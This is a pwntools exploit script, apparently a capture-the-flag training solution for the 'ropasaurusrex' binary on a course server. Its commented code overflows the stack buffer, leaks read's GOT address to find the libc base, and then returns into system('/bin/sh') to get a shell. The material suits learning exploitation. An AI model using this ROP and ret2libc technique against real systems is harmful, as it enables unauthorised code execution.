from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./ropasaurusrex")
    gdb.attach(r, """
            # after read
            #b *0x804841b 
            # before read
            #b *0x08048416
            c
                """)
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2014)

##### EXECUTE THE ONE GADGET #####

# load the libc for calculating the address of system and /bin/sh (alternative method)
libc = ELF("./libc-2.35.so")

main = 0x0804841d  # address of main
write = 0x0804830c  # address of write
read_got = 0x804961c  # address of the got.plt section of read
# b"\x90" * 140 to arrive to the return address +
payload = b"\x90" * 140 + p32(write) + p32(main) + \
    p32(1) + p32(read_got) + p32(4)
#   address of write + address of main (in order to create a loop)
#   + fd + address of the string to leak + size
# toleak could be any address in the got.plt section (the binary is not PIE so got.plt is always at the same address)

r.send(payload)  # send the payload
leaked_read = r.recv(4)  # receive the leaked address
read_libc = u32(leaked_read)  # calculate the address of read in libc
print("[!] read_libc %#x" % read_libc)  # print the address of read in libc

# we need the base address of libc in order to calculate any other address
# first address of libc is the leaked address minus the offset of read in libc (costant)
# i can use this value to calculate the base address of lib
# the value 0x10a0c0 is the offset of read in libc
libc_base = read_libc - 0x10a0c0
print("[!] base_libc %#x" % libc_base)  # print the base address of libc

# set the base address of libc in order to use the symbols (alternative method)
libc. address = libc_base
# magic = libc_base + 0xdee03
# payload = b"A" * 140 + p32(magic)

# address of system in libc calculated as base_libc + offset of system in libc (found with  objdump -d libc-2.35.so | grep system)
system = libc_base + 0x0048150

system = libc.symbols['system']  # alternative method
# address of /bin/sh in libc calculated as base_libc + offset of /bin/sh in libc (found with strings -a -t x libc-2.35.so | grep /bin/sh or using ghex libc-2.35.so)
binsh = libc_base + 0x1bd0f5
binsh = next(libc.search(b'/bin/sh\x00'))  # alternative method
# payload to send to the binary composed by 140 bytes of padding + address of system + address of exi (return address) + address of /bin/sh (parameter of system)
payload = b"\x90" * 140 + p32(system) + p32(0) + p32(binsh)


r.send(payload)

r.interactive()
